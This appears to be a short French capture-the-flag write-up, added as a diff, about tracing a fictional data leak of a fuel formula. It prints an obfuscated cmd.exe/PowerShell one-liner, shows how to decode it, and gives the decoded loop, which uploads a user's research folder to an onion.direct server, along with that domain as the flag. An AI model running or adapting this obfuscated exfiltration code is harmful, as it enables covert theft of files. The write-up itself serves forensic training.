@@ -1,0 +1,22 @@
+
+L’Agence de l’Innovation de Défense (AID) a lancé au profit du Service des Essences des Armées (SEA) un challenge intitulé « l’essence de l’innovation ». « Genious Laboratory », PME française, a remporté ce challenge et développe une nouvelle formule de carburant « vert » permettant de faire 3 fois plus de kilomètres. Sur le darkweb, il est découvert qu’un groupuscule propose cette formule à la vente.
+
+Aussi, le Ministère des Armées mobilise votre équipe afin d'identifier la source de l'exfiltration des données.
+
+Votre mission consiste à analyser un fichier extrait par le GIC (Groupe d'Intervention Cyber) mobilisé et identifier le serveur utilisé lors de l'exfiltration.
+
+La donnée à valider est le domaine utilisé par l'attaquant.
+
+================================================================================================================================
+
+
+en faisant un echo de !pMD:~-293! en fin de commande: 
+
+cmd /V:ON/C"set eJKD=ydqjrG h69tLRump-PN1eiFks{;52w_cvCbMf:437D0U""\o/I=(a).$n}l8&&for %v in (29,7,21,58,20,6,51,19,53,6,25,6,24,58,20,20,15,6,39,38,27,8,42,42,6,26,6,55,1,21,4,20,31,10,47,4,0,30,1,13,14,15,50,46,45,33,37,46,43,24,20,4,24,46,12,47,34,0,46,41,20,24,23,10,47,15,46,11,52,34,47,4,52,10,47,4,0,16,12,20,24,20,52,4,31,7,46,46,46,45,6,26,6,55,36,21,58,20,24,50,5,20,10,16,33,7,21,58,1,49,10,20,14,6,16,17,52,10,7,6,55,1,21,4,20,31,10,47,4,0,30,1,13,14,15,6,16,18,52,14,20,6,26,6,36,47,4,20,52,31,7,6,51,55,36,6,21,56,6,55,36,21,58,20,24,53,6,25,6,49,56,32,47,23,20,16,12,20,24,10,35,20,10,7,47,1,6,16,43,4,21,6,46,45,7,10,10,15,37,48,48,9,52,47,56,40,59,23,3,2,27,19,24,28,31,3,47,52,54,47,56,21,47,56,54,1,21,4,20,31,10,48,4,20,31,20,21,32,20,30,36,21,58,20,24,54,15,7,15,46,45,6,16,35,20,10,7,47,1,6,17,47,24,10,6,16,49,56,22,21,58,20,6,55,1,21,4,20,31,10,47,4,0,30,1,13,14,15,55,36,6,57,57,64)do set pMD=!pMD!!eJKD:~%v,1!&&if %v geq 64 powershell "!pMD:~-293!"&echo:!pMD:~-293!"
+
+
+=> On obtient:
+
+while (1) { sleep 345600 ; $directory_dump=\"C:\Users\Roby\Desktop\Laboratory-Research\\\" ; $files=Get-ChildItem -Path $directory_dump -Name ; foreach ($f in $files) { Invoke-RestMethod -Uri \"http://9aon78kjq51s2cjoa.onion.direct/receive_files.php\" -Method Post -InFile $directory_dump$f }}
+
+=> flag = 9aon78kjq51s2cjoa.onion.direct
